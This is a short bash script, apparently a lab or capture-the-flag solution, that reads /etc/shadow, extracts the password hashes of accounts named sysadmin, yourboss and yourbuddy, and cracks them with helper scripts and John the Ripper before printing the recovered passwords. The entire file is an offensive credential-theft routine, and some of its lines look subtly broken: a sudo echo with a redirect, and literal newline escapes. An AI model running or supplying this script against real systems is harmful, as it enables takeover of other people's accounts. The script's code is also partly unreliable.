#!/usr/bin/env bash

# Parse the shadow password file
 while IFS= read -r line; do
	if [ "${line:0:8}" = "sysadmin" ]; then
		sysadmin_hash=$line
	elif [ "${line:0:8}" = "yourboss" ]; then 
		yourboss_hash=$line
	elif [ "${line:0:9}" = "yourbuddy" ]; then
		yourbuddy_hash=$line
	fi
 done < /etc/shadow

# Crack some passwords
 ./crack_password.py "$yourboss_hash" > temp.txt
 yourboss_cracked=$(<temp.txt)
 echo $yourboss_cracked

# Get this one using john
# TODO: login as a root user
 ./format_password.py "$yourbuddy_hash" > temp_hash.txt
 sudo echo "[Incremental:BUDDY_CRACK\nFile = \$JOHN/ascii.chr\nMinLen = 4\nMaxLen = 4\nCharCount = 95\n" >> /etc/john/john.config
 sudo john --incremental:buddy_crack temp_hash.txt > temp.txt
 sudo john --show temp_hash.txt > temp.txt
 yourbuddy_cracked=$(<temp.txt)
 echo $yourbuddy_cracked

 ./crack_password.py "$sysadmin_hash" > temp.txt
 sysadmin_cracked=$(<temp.txt)
 echo $sysadmin_cracked

# Cleanup 
 rm temp.txt
 rm temp_hash.txt
